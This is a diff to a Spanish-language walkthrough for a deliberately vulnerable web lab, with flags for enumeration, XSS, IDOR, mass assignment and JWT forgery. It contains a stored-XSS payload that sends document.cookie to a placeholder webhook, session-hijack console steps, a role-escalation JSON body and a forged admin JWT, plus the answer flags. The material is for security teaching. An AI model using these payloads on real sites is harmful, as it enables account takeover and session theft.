@@ -8,17 +8,17 @@ Este documento describe el flujo completo para resolver el laboratorio: desde un
 
 ## Resumen de flags
 
-| # | Flag | Vulnerabilidad |
-|---|------|-----------------|
-| 1 | `FLAG{user_enumeration_is_real}` | Enumeración de usuarios |
-| 2 | `FLAG{stored_xss_persisted}` | Stored XSS vía subida de CV |
-| 3 | `FLAG{session_hijacked}` | Session hijacking (cookie sin HttpOnly) |
-| 4 | `FLAG{idor_horizontal}` | IDOR horizontal en candidatos |
-| 5 | `FLAG{mass_assignment_abuse}` | Mass assignment en perfil |
-| 6 | `FLAG{binary_files_hide_secrets}` | Archivo binario sin extensión |
-| 7 | `FLAG{jwt_forged_successfully}` | JWT con secret débil |
-| 8 | `FLAG{logs_are_sensitive}` | Logs expuestos |
-| 9 | `FLAG{internlink_compromised}` | Acceso total como admin |
+| #   | Flag                              | Vulnerabilidad                          |
+| --- | --------------------------------- | --------------------------------------- |
+| 1   | `FLAG{user_enumeration_is_real}`  | Enumeración de usuarios                 |
+| 2   | `FLAG{stored_xss_persisted}`      | Stored XSS vía subida de CV             |
+| 3   | `FLAG{session_hijacked}`          | Session hijacking (cookie sin HttpOnly) |
+| 4   | `FLAG{idor_horizontal}`           | IDOR horizontal en candidatos           |
+| 5   | `FLAG{mass_assignment_abuse}`     | Mass assignment en perfil               |
+| 6   | `FLAG{binary_files_hide_secrets}` | Archivo binario sin extensión           |
+| 7   | `FLAG{jwt_forged_successfully}`   | JWT con secret débil                    |
+| 8   | `FLAG{logs_are_sensitive}`        | Logs expuestos                          |
+| 9   | `FLAG{internlink_compromised}`    | Acceso total como admin                 |
 
 ---
 
@@ -50,45 +50,47 @@ Este documento describe el flujo completo para resolver el laboratorio: desde un
 ```html
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>CV</title></head>
-<body>
-<h1>Currículum</h1>
-<p>Contenido de ejemplo.</p>
-<script>
-(function(){
-  var w = "TU_WEBHOOK_AQUI";
-  var x = new Image();
-  x.src = w + "?c=" + encodeURIComponent(document.cookie || "(vacío)");
-})();
-</script>
-</body>
+  <head>
+    <meta charset="utf-8" />
+    <title>CV</title>
+  </head>
+  <body>
+    <h1>Currículum</h1>
+    <p>Contenido de ejemplo.</p>
+    <script>
+      (function () {
+        var w = "TU_WEBHOOK_AQUI";
+        var x = new Image();
+        x.src = w + "?c=" + encodeURIComponent(document.cookie || "(vacío)");
+      })();
+    </script>
+  </body>
 </html>
 ```
 
 2. Guárdalo como `cv.pdf` (solo cambia la extensión a `.pdf`).
 3. Con tu usuario estudiante, sube ese “CV” en el panel (Subir Currículum Vitae).
-4. El servidor guarda el archivo y simula una revisión automática. La flag asociada a este acto está en los datos internos de esa revisión.
-5. **Flag 2:** La flag `FLAG{stored_xss_persisted}` aparece en la nota de la revisión generada por el sistema (en el backend). Para verla sin acceder al código: confirma que el XSS se ejecutó (p. ej. cookie recibida en el webhook o mostrada en consola al abrir `/view-cv/<tu_archivo>`). La flag se considera obtenida al demostrar que el XSS persistente funciona; en el código está en el campo `review_note` del registro de revisión.
-
-**Alternativa para ver la flag en el flujo:** Si tienes acceso a los logs del servidor o a una ruta que liste revisiones, la flag está en el texto de la revisión del CV malicioso.
+4. El servidor guarda el archivo y simula una revisión automática. En esa revisión se envía una petición a tu webhook con la cookie de la empresa y la flag de este acto.
+5. **Flag 2:** En tu webhook verás una petición GET con dos parámetros en la URL: `c` (cookie de la empresa, ver Acto 3) y **`flag`** = `FLAG{stored_xss_persisted}`. Revisa la pestaña Query/Params de la petición para copiar la flag.
 
 ---
 
 ## Acto 3 — Session hijacking
 
-**Vulnerabilidad:** La cookie de sesión (`session_token`) no tiene el flag `HttpOnly`. Cualquier script en el mismo origen (por ejemplo el XSS del Acto 2) puede leerla. Si un “revisor” (bot interno) o una empresa abre el CV malicioso, su cookie se puede exfiltrar y reutilizar.
+**Vulnerabilidad:** La cookie de sesión (`session_token`) no tiene el flag `HttpOnly`. Cuando el proceso automático “revisa” el CV subido, simula que una empresa (TechCorp) abre ese archivo. El sistema detecta la URL de tu webhook en el HTML y envía la cookie de sesión de la empresa a esa URL, como si el script del CV la hubiera exfiltrado.
 
 **Pasos:**
 
-1. Con el payload del Acto 2, el script en el “CV” puede leer `document.cookie` y enviarla a tu webhook.
-2. En un escenario real del lab, el proceso automático que “revisa” el CV ejecuta ese HTML; la sesión que se usa en ese contexto es la de una empresa (p. ej. TechCorp). Esa cookie llega a tu webhook.
-3. En tu navegador (o en una ventana de incógnito), abre DevTools → Application (o Console) y establece la cookie robada:
+1. Tras subir el “CV” malicioso del Acto 2 (con tu webhook dentro del HTML), el servidor ejecuta la revisión automática y **envía la cookie de la empresa** a tu webhook. No hace falta que nadie abra el enlace a mano.
+2. Abre tu webhook (webhook.site, RequestBin, etc.). Verás una petición **GET** con los parámetros `c` (cookie exfiltrada) y `flag` (Flag 2). En Query/Params: `c` = `session_token=<valor_hex>` y `flag` = `FLAG{stored_xss_persisted}`.
+3. Copia el **valor** de `session_token` (solo la parte hexadecimal larga, o la cadena completa `session_token=...` si usas la consola).
+4. En tu navegador (o en una ventana de incógnito), abre DevTools → Console y establece la cookie y recarga:
    ```js
-   document.cookie = "session_token=VALOR_ROBADO_AQUI";
+   document.cookie = "session_token=VALOR_HEX_QUE_COPIASTE";
    location.href = "/";
    ```
-4. Recarga o ve a la raíz. Deberías entrar al **panel de empresa** (TechCorp).
-5. **Flag 3:** En el panel de empresa, en la sección “Información de Cuenta”, el campo **API Key** contiene la flag: `FLAG{session_hijacked}` (viene en un valor tipo `tc_prod_FLAG{session_hijacked}_v2`).
+5. Deberías entrar al **panel de empresa** (TechCorp).
+6. **Flag 3:** En el panel de empresa, en la sección “Información de Cuenta”, el campo **API Key** contiene la flag: `FLAG{session_hijacked}` (viene en un valor tipo `tc_prod_FLAG{session_hijacked}_v2`). A partir de aquí puedes seguir con el Acto 4 (IDOR) desde ese mismo panel.
 
 ---
 
@@ -117,7 +119,12 @@ Este documento describe el flujo completo para resolver el laboratorio: desde un
 2. Abre DevTools → Network. En el panel, al “Guardar Cambios” del perfil se envía un `PUT` a `/api/profile/update` con nombre, teléfono, universidad, etc.
 3. Intercepta la petición (o construye una manualmente) y añade en el JSON:
    ```json
-   {"name": "Tu Nombre", "phone": "...", "university": "...", "role": "coordinator"}
+   {
+     "name": "Tu Nombre",
+     "phone": "...",
+     "university": "...",
+     "role": "coordinator"
+   }
    ```
    O envía solo: `{"role": "coordinator"}` (el backend mezcla con los datos actuales).
 4. Envía la petición. La sesión se actualiza y tu usuario pasa a tener rol `coordinator`.
@@ -150,7 +157,7 @@ Este documento describe el flujo completo para resolver el laboratorio: desde un
 
 1. Con el `jwt_secret` del Excel (p. ej. `internlink2024`), genera un JWT con payload:
    ```json
-   {"user_id": "1", "email": "admin@internlink.com", "role": "admin"}
+   { "user_id": "1", "email": "admin@internlink.com", "role": "admin" }
    ```
    Algoritmo: HS256.
 2. Puedes usar el script `payloads/jwt_forge.py` del repo:
